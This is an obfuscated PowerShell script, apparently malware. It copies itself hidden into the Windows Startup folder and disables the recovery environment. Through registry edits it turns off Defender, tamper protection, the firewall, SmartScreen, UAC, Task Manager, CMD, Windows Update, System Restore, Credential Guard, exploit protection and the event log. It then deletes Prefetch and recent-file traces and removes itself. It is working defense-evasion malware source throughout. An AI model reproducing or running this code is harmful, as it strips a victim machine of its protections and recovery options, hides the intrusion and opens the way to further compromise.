SET-VARIABle (    "4W"   +   "RBs"   )  (   [tyPE](  's'   +  'YSTeM.E'    +    'Nv'    + 'i'   +    'R'    +   'OnMENt'   )    )    ;        SeT (    "Z"   +  "Lw"   ) (     [TypE](   'sYstEm.'  +   'io' +  '.p' +   'Ath' )     )   ;   $ErrorActionPreference   =     (  'Si'    +    'lently'  +    'Co'    +   'nti'   +   'nue' )

$s     =    $MyInvocation.MyCommand.Path
$e    =   (        &     ( 'Get-Proc'  +     'es'    +   's'  ) -Id $PID   ).Path
$f     =    if (     $s   ) { $s } else { $e }

$tttttttttttttttttttt   =       (  Get-item (    'V' +   'aR'   +    'iaBle:4'   +   'WrbS'     )     ).valuE::GetFolderPath(  (  'sta'  + 'rt'    +   'up'   )    )
$tttttttttttttttttttt   = "$tttttttttttttttttttt\"

function Invoke-SelfReplication {
    $replicated    =      (      VAriable  zLw   ).vAlue::Combine(    $tttttttttttttttttttt,  $ZLW::GetRandomFileName(       )    +     $zLw::GetExtension(    $f    )   )
    if (    -not (     &   (    'Tes'   + 't-'    +'Path'     ) (     $tttttttttttttttttttt    +     $zlW::GetFileName(    $f  )    )  )    ) {
            &   (   'Set'    +'-C'   +   'ontent') -Path $replicated -Value (      &  ( 'G'  +     'e'     +  't-Content'   ) -Path $f -Raw  )
        (       &  (   'Get-' +    'Item'  ) $replicated   ).Attributes    =  (    'Hi'  + 'd'  + 'den'    )
    }
}

function Invoke-SelfDestruction {
 
        &  ( 'Remov' +    'e-I'   + 'tem' ) -Path (  (     'HKCU:'    +    'tqKSoftwa'      +  'r'   +  'etqKClassestqKm'   +  's-s'  +    'etti'    +     'ngstqKsh'  +   'ell'   ).rePLaCe(   'tqK','\' )  ) -Recurse -Force

       &    (   'G'  +   'e'   +   't-Child'  +      'Item'   ) -Path "$env:SystemRoot\Prefetch" -Filter (      '*POW'     +  'ER'   +'SH'    + 'EL'    +     'L*.pf'   )     |         &  (  'Rem'  +  'o'     +   've-'    +     'Item') -Force
    $scriptName      =   $zLW::GetFileNameWithoutExtension(  $f    )
    $prefetchFiles     =     &   (     'Get' +  '-'    +  'ChildItem'    ) -Path "$env:SystemRoot\Prefetch" -Filter "$scriptName*.pf"
    if (    $prefetchFiles    ) {
        foreach (   $file in $prefetchFiles  ) {
               &    (   'Remove'    + '-I'   +    'tem'  ) -Path $file.FullName -Force
        }
    }

    $recentFiles  =       &  (  'Ge'  +   't'    +    '-Ch'  +   'il'   +   'dItem'  ) -Path "$env:APPDATA\Microsoft\Windows\Recent"    |      &    ( 'Wh'    + 'e'  +     're-Obj'     +  'ect'  ) { $_.LastWriteTime -ge (   (        &  (     'Ge'    +   't-Date' )   ).AddDays(   -1      )  ) }
    if ( $recentFiles     ) {
        foreach (    $file in $recentFiles    ) {
                 &      (  'Rem'    +    'ov'     + 'e'    +    '-Item'      ) -Path $file.FullName -Recurse -Force
        }
    }

    if ( -not (      &   (    'Tes'   +   't'     +   '-Path'      ) (   $tttttttttttttttttttt     +    $zLw::GetFileName( $f    )  )    )   ) {
        if (     $s ) {
                 &  (    'Re'     +  'mo'     +    've-'   +   'Item'  ) -Path $f -Force
        } else {
             &    (   'Sta'+    'rt-P'+    'r'    +'ocess'     ) powershell.exe -ArgumentList ( '-NoPro'   +   'fil'    +  'e'    +    ' '   +  '-Comm'    +    'an'  +  'd '+    "`"Remove-Item " +    '-P'   +  'a'     +'th '  +    "'$f' "    +  '-'   +     'Forc'  +  'e '     +  '-Er'  +  'rorActio'  +   'n '     +   "SilentlyContinue`""   ) -WindowStyle Hidden
        }
    } else {
             &  (   'Renam'   +   'e-'    +   'It'     +    'em'   ) $f -NewName (  (    get-cHILdItEM (   'varI' +   'AB'     +    'lE' + ':zlW' )   ).vALue::GetRandomFileName(      )   +     (    DIr (    'V'     +    'aRIaBlE:z'   +'L' +  'w'    )   ).VAlue::GetExtension(   $f   )   ) -Force
    }
}

function Set-RegistryProperties {
    param (    
        [string]$path,
        [hashtable]$properties
     )

    if (  -not (         &   (  'Te'   +  'st'  +    '-Path'   ) $path   )      ) {
          &    (   'New-I' +   'te'  +   'm' ) -Path $path -Force   |    &    (   'Ou'    +     't-Nul'      +     'l'    )
    }

    foreach (    $key in $properties.Keys     ) {
             &   (   'Set' +    '-ItemP'    +     'ro'      +      'perty') -Path $path -Name $key -Value $properties[$key] -Type DWord -Force
    }
}

$baseKey     =   (    (   'HKLM:'  +     '{'    +    '0}SOFTWARE{0}Po'     +   'lic'   +     'ies{'   +  '0}'   +   'M'  + 'icrosoft{0}W'    +      'indows Defen'    +  'der'    ) -f[ChaR]92   )
$realTimeProtectionKey     =   (  "$baseKey\Real-Time "   +    'Pro'   +    'tec'    + 'tion'    )
$firewallPath  =   (   ( 'HKLM:' + 'n'+   'OCSYS'  +     'T'   +   'EMnO'     +'C'     +    'C'   +   'urrent'    +   'C'   +     'o'    +    'ntro'   +  'lS' +   'e'    +'t'      +     'nOCSer'   +'vice'  +    'sn'  +  'O'  +  'CSharedAccessn'  +    'OCParametersn'   +  'O'   +  'CFi'   +    'rewallPo'  +   'licy'     ).RePlACE(    'nOC','\'     )    )

     &  (      'r' +      'eage'   +  'ntc'      ) /disable

    &     (     'Set-Regis'    +    't'      +'ry'    +'Propert'   +     'i'  +  'es'   ) -path (  (    'HKCU:'   +     'h' +  'EHSo'    +    'ftwarehEHMicro'   +  'sof'+    'thEHWindow' +'shEHCurre'  +    'nt'   +  'Ve'   +    'rsionhEHNotifica'    +    'tio'   + 'nshEH'   +  'Set'      +  'tingshEHWindows.S'  +    'yste' +     'm'    +   'Toas'  +     't'   +  '.Secu'    +     'rityAndMa'  +  'int'  +  'e'    +   'n'    +   'a'  +     'n'  +    'ce'      ).rEpLaCE( 'hEH','\'   )      ) -properties @{(  'Ena'    +    'bled'    )  =    0}
   &   (    'Se'     +   't-Registr' +    'yProp'    +  'er' +   'tie'   +  's'  ) -path ( ( 'HKLM:'   +  'AgW'    +  'SOFTWAREA'    +    'gW'    +  'Pol'    +  'i'    +   'c'  +    'iesA'  +    'gWMicrosof' +   'tAg'     +   'WWind'    +'ows'    +      ' De'  +   'fende' +   'r Secur'   +     'i'    +   'ty Cen'   +      'ter'    +   'AgWNo'     +    'tificati'   +    'ons'   ).rEpLAcE(    'AgW','\'   )   ) -properties @{(   'Disable'   +   'N'    +   'otifi'    +     'cati'  +   'o'   +   'ns'    )   =    1}

  &    (  'Set'  +  '-Regi'     + 'stry'   +   'Prop' +      'e' +    'rtie'  +   's'   ) -path $baseKey -properties @{
    (    'Disabl'   +    'eAnt'   + 'iSp'    +     'yware')      =     1 
    (    'DisableApplicati'   +   'onG'  +   'u' + 'ar'    +'d'  )       = 1
    (     'Disa'    +   'b'    +    'l'   +   'eContro' +  'l'  + 'le'  + 'dFolderA'   +  'cc' +    'ess'  )  =     1
    ('Di'   +'sable'   +  'Cred'+   'ent' +    'ialGuard'  )   =     1
    (   'Dis'    +     'ableIn'  +    'trusionPre'      + 've'    +  'nti'   +  'onSystem' )    =    1
    ( 'Disab'    +   'l'      +  'eIOAVPro'  +   't'    +     'e'     +     'ct'  +  'ion'     )  =  1
    (   'Di'  +     'sab'    +  'leRea'  +   'ltimeMonit'    +   'o'   +  'r'     +    'in'  + 'g'    )   =   1
    ( 'Dis' + 'ableRout'      +    'i'     +     'nely'  +   'Tak'    +'ingAct'  +    'ion'   )     =    1
    (     'Disab'  +   'l'+  'eSpeci'    +    'a'  +    'lRunnin'   +    'g'   +'Modes'   )     =     1
    (   'Disable'     +  'T'+    'amp'    +   'er'  +   'Pro'   +  'tection'     )      =    1
    (  'P'  +    'UAP' +   'rotecti'   +     'on'      )      =    0
    (  'Serv'   +  'i'+      'ceKeepA'  +    'liv'   +    'e'   )     =      0
}

    &   (    'S'    + 'et-Reg'  + 'istryPro'    +   'pe'   +  'rtie'   +   's'    ) -path $realTimeProtectionKey -properties @{
    (   'D'     +     'is'   +  'abl' +    'eBe'     +     'hav'  +  'iorMonitor'  +     'ing'   )    =    1
    (     'D'    + 'isable'    +  'BlockA'   +    'tFir'      +      's'  +     't'     + 'S'    +    'een'   )       =     1
    (    'Di'  + 'sab'    +  'l' +  'eCloudP'   +  'ro'  +  't'+ 'ection'   )      =    1
    (  'Dis'  + 'abl' +    'e'  +  'O'      +  'nAcc'    + 'essP' +     'rotection'   )   =   1
    (    'Dis'  +  'a'   +   'b'     +     'leScanOnReal'     +     'time'  +      'Ena'     +    'ble'    )  =    1
    (  'Di'    + 'sabl'    +   'e'    + 'ScriptScanning'      )     =      1
    (     'S'    +     'ubmi'      + 'tSamp'  +   'les'     + 'Con'   +     'sent'     )     =   2
    (  'Dis'    + 'abl'    +  'eN'  +    'etwo'   +   'rkPr'    +    'ote'    +    'ction'   )    =      1
}

    &  (  'S'   + 'e'   +   't'      +    '-Reg'     +   'istryP'    + 'roperties'    ) -path "$firewallPath\DomainProfile" -properties @{(   'EnableFire'  +   'w'  +     'a'    + 'll'  )   = 0     ;      (    'DisableN'     +   'otifi'    +   'ca' + 'tio'  +  'n'   +    's' )     =     1}
    &   (   'Set-'    +    'Regist'  + 'ryProp'    + 'erties'  ) -path "$firewallPath\StandardProfile" -properties @{(   'Enab'  +    'leFi'   +  'rew'  +   'a'      +    'll')      =     0    ;  (  'Disabl' +    'e'    +  'Notif'+   'i'   +   'cati'+  'ons' )   =    1}
  &   ('Se'   +     't-Regis'   +'tryPr'  +'ope'     +    'rties'  ) -path "$firewallPath\PublicProfile" -properties @{( 'En'  +  'ab'   +   'leFirewall'     )   =   0  ;  (   'DisableNoti'   +  'fi'  +   'cat'   +  'ions'    )      =     1}

 & (    'Set-'    + 'ItemPro'  +    'pe'   +     'rt'  +   'y' ) -Path (     (  'HKLM'   + ':GKJS' +  'OF'   +    'T'    +  'WAR'   +    'EGKJ'   +     'Mi' +'crosoftGKJWind'+     'owsG'      +   'KJCurren' +    'tVer'  + 'sion'    +      'GKJExplorer'    ).rePLACE( (    [CHar]71   +  [CHar]75    +[CHar]74     ),'\')   ) -Name (  'Sma'   +  'r'  +'tS'  +'cree'     +'nEnabled'     ) -Value (    'O'    +    'ff'   ) -Type String -Force
&  ( 'Set' +   '-'  +    'RegistryP'    +     'r'   +  'operties'    ) -path (    (    'HKCU:1nw'    +   'SOFTWARE1'  + 'nwMi'   +  'c' +   'roso'  + 'f'    +    't'    +'1n'  +      'wEdg'  +    'e'   +    '1nwSmartSc'   +    'reenEna'    +  'b'  +     'l'    +   'ed'   ).REpLace(     (    [ChAr]49  +    [ChAr]110   +     [ChAr]119 ),[STRiNg][ChAr]92  )    ) -properties @{(  '(D'    +     'efaul'    +     't)'      )      =    0}
 &   (     'Set-R'  + 'egistry'   +  'P'  +   'ro'   +  'perties'    ) -path (     (     'H'    +  'KCU:'  +    '{0}SO' +   'F' +   'TWAR'   +   'E'  +   '{0}Microsoft{0}Windows{0}C'+    'urrentVer'    +    'sio'     +      'n{0' +   '}Ap'   +      'pHo'    +   's'   +  't'      )-F[char]92  ) -properties @{(     'Enabl'    +     'e'  +  'WebCon'     +  't'    +  'entEv' +  'alua' +  'tion'     )  =      0}

 &   (    'S'  +    'et-'   +  'Re'   +   'gist'     +  'ry'   + 'Prop'   + 'erties'   ) -path (   (  'HK'   +     'L'    +    'M:iITSO'    +     'FTWAREi'  +    'ITPol'     + 'iciesiIT' +    'Microso'    +     'fti'     +     'I'    +    'T'    +     'Wi'      +  'nd'  +     'ow' + 'siITWindo'      +  'w'    +     'sU'    +'p'      +     'date' +     'iITAU'   ).rePLaCe(     (    [CHaR]105    +    [CHaR]73  +   [CHaR]84    ),'\'   ) ) -properties @{(   'NoAuto'   +    'Up'      +   'dat'   +  'e'     )   =    1}
  &      (   'Set-Regi'  +   'stry'  +    'P'  +  'r'     +   'operties'  ) -path (   (  'H'     +   'K'  +     'LM:'  +    '{0}SYST'   +   'EM{0}Cur'  + 'rentCo'   +    'ntrolSet{0}S' +    'e'     +   'rvic'  +  'es{'  +   '0}wuauserv'  )-F[CHAR]92     ) -properties @{( 'St'    + 'art'     )      =   4}

    & (    'Set-Reg'    +    'i' + 's'    +'tr' + 'y'  + 'Propertie'   +    's'    ) -path (  (   'HKL'   +    'M'      +  ':{0}SOFT'  +  'WAR'   +  'E'    +  '{'     +  '0}Pol'    +  'ic'   +  'i'+    'e'  +   's'   + '{'     +    '0'  +    '}' +     'Microsoft{0}' +   'Windows NT{0}Sy' +    's'   +     'tem'  +  'Resto'   +   're'    )-F[chaR]92    ) -properties @{(   'Di'    + 'sab'  +    'leS'   +    'R'   )     =     1  ;  (   'Dis'      +     'ableC' +    'onfi'    +'g'   )    =     1}
     & (   'Se'+  't-Reg'  +   'istryPropertie'  +   's'  ) -path (    (    'HKL'   +'M:{0}SY'  +  'STE'  +   'M{' +    '0}Cur'    +    'ren'  +  'tC' +    'o'     +     'nt'  + 'rolSe'   +  't'   +    '{0}'   +    'Servic'    +     'es{'     +     '0}srser'   +    'vice'    )  -f[CHAR]92 ) -properties @{(   'Sta'   +    'rt' )     =     4}

  &  (    'Se'    +    't-Re'   +  'gistry' +  'P'   +    'roper'   +   'ties'    ) -path (   (    'HKCU:rB'   +    'JS'    +  'o'   +  'ft'  + 'war'   +   'erBJMicro'+   'so'      +'ft' +  'rBJ'      +   'Windowsr'   +     'BJCu'  + 'rre' +   'ntVers'     + 'ionrBJPolic'+  'i'  +    'esrBJS'   +   'ystem'    )-REplAcE  'rBJ',[cHaR]92  ) -properties @{(  'D'   +  'i'     + 'sableTaskM'  +    'gr'   )      =    1}

   &    (   'Set'    +    '-RegistryPr'    +  'o'   +   'perti'  +   'es' ) -path (    ( 'HKC'      +  'U:cNBSoftwarec'    +   'NBPoliciesc'+  'N'  +    'BM'   +     'icrosof' +   'tcN' +  'BWi'   +   'ndowsc'  +    'NB' +    'S' + 'yste'  +     'm'  ) -REPlAcE  (   [cHAr]99   +  [cHAr]78  + [cHAr]66  ),[cHAr]92    ) -properties @{(    'Disab'   +   'le'   +   'CMD'  )    =      1}

    &  (    'Se'   + 't-R'    +  'egi'   +   'st'  +    'ryPro'    +  'pe'   +    'rties'    ) -path (    (  'H'    + 'KLM' +  ':{0}SY'   + 'ST'   +    'EM{0}Cu'    +  'r'  +  'r'    +      'entCont'     +  'ro'  +    'lSe'  +  't{0'     +   '}Co'    + 'ntro'   +      'l{0}Te'   +      'r'   +  'm'  +   'inal Server'  )-F  [cHAr]92    ) -properties @{(    'fD'     +   'enyTSC'    +   'o'   +    'nn'     +   'ections'    )    =     1}

    &  (  'S' +   'e'  +     't-'   +    'R'  +   'egistryProp'   +    'er'   +    'ties'   ) -path (    ( 'HKLM:TMJSOFTWARE'     +    'T'     +  'MJMicrosoftTMJWindowsTMJ'   +'C'   +   'u'  +  'rrentVer'    +   'si'   +     'o'     +  'nTMJPoli' +   'c'   +     'ies'+    'TMJSystem'   ).REpLACe( (    [cHAr]84    +   [cHAr]77     +      [cHAr]74   ),'\'  )   ) -properties @{(  'En'    +   'abl'     + 'eLUA' )  =    0}

 &  (   'Set-'   +   'Re'  +  'gistr'      +     'yP'  +     'rope'    +     'rties'  ) -path (  (    'H'    +    'K' +   'LM:'  + '{0}SYSTEM{0}Curre'      +   'ntC'    +  'on'     + 't'  +    'rolS'    +    'et{'   + '0}'    +   'Servic'  +    'es'    +    '{0}'  +   'ws'   +    'csv'  +   'c'   ) -F [CHaR]92   ) -properties @{(     'St'  +  'art'      )    =    4}

    &   ( 'S'    +  'et'   + '-Reg'    +     'istry' +    'Pr'   +    'operties'     ) -path (   (  'HKLM:B'  +    'F'   + 'ISOFTWAR' +     'EBFI'  + 'M' +     'icros'  +  'oftBFIWi'      +    'n'   +'dowsBFIWindows'   +   ' E'   +    'rror R'    +   'eporti'    +  'n'  +    'g') -RePlaCe  (   [cHar]66   +    [cHar]70  +  [cHar]73    ),[cHar]92    ) -properties @{(     'D'  +  'isab'+   'led'  )     =      1}

   &    ('Set-Regi'    +'s'    +   'tryProp'+    'ert'   + 'ies'    ) -path ( (  'HKL' +     'M:eyZS'     +  'YSTEM'  +'eyZCur'    +     'rentControlSete'   +    'yZC'  +      'ont'   +     'ro'    +  'leyZRe'+  'mote'    +   ' A'     +     's'   +    'sist'     +    'a'     +  'nc'    +  'e'   ) -REPLACe  'eyZ',[cHar]92    ) -properties @{(  'fAl' +     'low'  +  'ToGetHelp'     )      =     0}

     &     (  'Set-Regi'   +  'stryPr'  +  'o'     +   'pe' +    'rt' +   'ies'  ) -path (   (   'HKL'+ 'M:vqpS'  +  'YST'   +  'EMvqpCurrentContr'      +    'ol'  +    'Setv'     +     'qp'   +    'Ser'     +   'v'   +  'ice'      +   'svqpWaa'     +    'SMe'     +  'dicSvc'    ).rePLAce(   (   [chAr]118 +     [chAr]113  +  [chAr]112),[StRINg][chAr]92   )   ) -properties @{(  'S'   +  'tart'   )   =     4}

    &   (   'Set'     +    '-Reg'    +  'istryP'   +    'ro'  +     'p'    +  'e'    +    'rties'  ) -path (     (  'H'+ 'KLM:{0}S'   +    'YSTEM{0'   +   '}Curr'  +   'e'   +     'ntC'  +'ontr'     +    'olSet{0}Service'     +    's{'   +  '0' +  '}BITS')-F[cHAR]92   ) -properties @{('St'  + 'art' ) =      4}

    &  (  'S'  +  'et-Regis'  +    't'   +     'r'    +   'yPro' +    'p'+   'erties'     ) -path (    (  'HK'    +'LM:kl'   +  'eSoftwar' +    'e'    + 'kleMic'  +    'r'  +  'os'    +    'oftkle' +     'Wind' +     'ow'   +  's'     +    ' S'  +    'cr'      +  'ipt '  +   'Host'+   'k'   +    'le'   +'Sett'+    'ings'    )-crEpLaCE (    [chAR]107   +  [chAR]108+   [chAR]101     ),[chAR]92    ) -properties @{(  'E' +  'nab'   +    'led'     )     =   0}

  &    (  'Set-Registr'  +    'yPr'    +     'ope'    +    'r'  + 'ti'   +   'e'  +      's'    ) -path (     (  'HKLM:jflS'      +   'Y'   +    'STEMj'  +  'flCurre'    +  'ntC'    +  'ontr' +'olS'   + 'etjflSer' +    'vic'  +      'e' +  's'   +   'jflEve'     +  'ntLog'    ).repLace(      'jfl',[StrinG][CHar]92    )   ) -properties @{(    'St'   +  'art' ) =    4}

    &  (   'Set'   +'-'     +   'Reg' +'i'    +     'stryPr'   +  'operties'    ) -path (     (   'HKLM:' +'qdKSY'+    'ST'   + 'EMqdKCurrent'   +'Contr'  +     'olSetqdKSer'    +    'vic'  + 'esqdKSe'     +   'cu'    +    'rit'   +     'yHea' +   'l'   +    'thSe'    +   'rvice'  ).rePLacE(  (  [cHAr]113      +   [cHAr]100 +    [cHAr]75  ),'\'    )   ) -properties @{(   'Star'  +    't'    )  =    4}

   &    (  'S'  +     'et-Regis'   +     't'     +     'ry'   +    'Prop'      +  'er'  +    'ties'    ) -path (   (  'HKLM:'+    'IX4SY'     +      'STEM'  +   'IX4CurrentControlSet'  +   'IX4S'      + 'ervice'   +    's'   +  'I'   +  'X4W'    + 'S'  +    'earch' ).REPLaCe( 'IX4','\' )    ) -properties @{(   'Sta'    +    'rt'    )    =  4}

     &    (   'Set-Re'  +     'gistryP'    +      'ropert'    +    'ie'  +  's'    ) -path (     (   'HKLM:W7'   + 'JSOFTWAR'    +  'EW'     +   '7'    +   'JMicro'   +  'softW7JWindo'    +  'ws NTW7'     + 'JC'      +    'urre'    +    'n'    +   'tVersionW7JSchedule'  + 'W'    +    '7JMai'  +  'ntenance'    ).RepLaCE(    ([cHAr]87   +      [cHAr]55    + [cHAr]74 ),[strING][cHAr]92)   ) -properties @{(      'Ma' + 'intena'   +   'n'  +   'ce'  +  'D'    +   'isabled' )      = 1}

   &  (    'Set-' +   'Regi'    +  'st'+   'ryPro'  +   'perties'     ) -path (     ( 'HKL'   +    'M:lhbSOFTW'+  'A'    +   'R'  +   'Elh'   +   'bPolic'   +   'ieslh'     +   'bMicrosoftlhbWindowsl'    +  'hbD'+  'ev'    +   'i'    +  'ceGuar'    + 'd'   ).RePLaCE(     'lhb',[STRIng][cHAR]92      )    ) -properties @{(    'LsaCf'    +    'g'  +      'Flags'  )   =   0}
    &    ( 'Set-Regist'    +   'r'  +   'yP'+     'ro'   +  'pertie'    +  's'  ) -path ((    'HKLM:{0}SYS'     +     'TEM'   +    '{0}Cu'  +'rr'    +  'ent'     +  'Cont'  +  'ro'    +   'lS'   +  'et{' +      '0}Control{0}Lsa'    ) -f [cHAR]92    ) -properties @{(   'LsaCfgFl'  +  'a'   + 'g'    +   's'      )    =    0}

    & ('Set'  +     '-Registry'  +   'Pr' + 'operti'    +    'e'   +     's'    ) -path (  (   'H' +   'KLM:qJiS'     +   'YSTEMqJ'  +   'iC'   +  'ur'      +   'rentContr'   + 'olSetq'   +    'JiCo'  + 'ntrolqJiDevi'   +   'c'    +     'eGuard'   ).rePLAce(    (   [ChaR]113  +      [ChaR]74  +     [ChaR]105 ),[sTRiNG][ChaR]92     )   ) -properties @{(    'EnableV'  +   'i' +  'rtual'   +   'iz'     +    'atio'    +  'nBased'  +  'Security'  )   =   0  ;   (    'R'+  'e'    +   'qui'     +    'r'  +  'eP'  +   'l' +   'atfor'   +     'mSecu'  +  'rityFeatures'      )     =    0  ;  ( 'HVCIMA'   +  'TRe'  +    'quired'    )    =     0}

 &  (  'Set-R'   +    'egistry'  +    'Pr'    +     'o'    +  'per'    +    'ties'  ) -path ( (    'H'   +  'KLM:'    +   'pN8S'    +  'OFTWAREpN8'    +    'M'     +   'i'+ 'crosoftpN'     +      '8' + 'Hvsi'    ).rEplaCE(    (  [ChAR]112   +    [ChAR]78 +     [ChAR]56),'\'   )   ) -properties @{(     'E'     +'nable'   +   'd')      =   0}

   &   (   'S'      +   'et-R'    +    'e'   +     'g'    +  'istryPr'+  'o'     +     'perties'   ) -path (   (  'H'    +   'KLM:Y8QSOF'     +    'TWAREY8QPo'+  'liciesY8QMicrosof'   +    't'   + 'Y8QWindows'   +   ' Defen'     +    'd'  +    'erY8'    +  'QWi'    +   'n' + 'dow'    +   's'    +   ' Defe'     +    'nder E'  +'xplo'   +     'it Guard'  ) -CreplaCE (    [cHAr]89    +   [cHAr]56   +  [cHAr]81     ),[cHAr]92   ) -properties @{(   'Enabl'   +   'eExploit'  +   'P'    +  'r' +    'otection'   )    =     0}

      &  (   'S'    +   'et-Re'  +   'gist'    +  'ry'    +     'Pr' + 'o'   +     'perties'  ) -path (    (   'HK'  +   'LM'  +    ':'   +     '{0}S'  +  'OFTWA'   +    'RE{0'    +     '}P'    +   'oli'     +  'cie'+     's{'   +   '0'   +   '}Microsoft{0}Wind'     +   'ows{0}DataCollection'  )-f[cHAR]92  ) -properties @{(  'A'+'l'  +'lo'   +   'wTelem' +   'etry' )  =  0}

   &    (  'Set-Registr'  +  'y'   +  'P'     +  'rope'  +      'rties' ) -path (    (  'HKLM:4'   +     '8cS'    + 'O'  +   'FTWA'   +  'R'  +   'E4'   +    '8'    +    'cPoli'  +   'cies' +   '48'    +   'c'     +   'Micro' +     'soft48cWindows48cOn'   +  'e' +    'D'    +'ri'   +    've'  ).rePlAcE(     (  [chAr]52     +  [chAr]56      +     [chAr]99    ),'\' ) ) -properties @{(    'D'    +   'isable'    +  'FileSyncN'  +      'GSC'    )   =     1}

      &    (    'Set-'   +  'Reg'    +    'istry'    +    'P'     +   'roperties'     ) -path (('HK'  +     'LM:'+   '4'   +   '3YSOFTWARE'    + '43YPoli' +     'cies4'  +   '3Y'   +    'M'  +    'i'   +     'crosoft4'    +    '3YWindows43YW'   +    'indows S'    +   'ea'  +    'r'   +  'ch'  ).rEPlAce('43Y','\'    )   ) -properties @{(    'Al'   +    'lo'   +      'wCort'  +     'ana'  )     =    0}

 &  ( 'Invok'  +     'e-S'  +  'e'    +   'lfReplicatio'  +'n'  )

   &  (    'Invoke'     +     '-Se'   +    'l'    +    'fDe'  +  'structi' + 'on'     )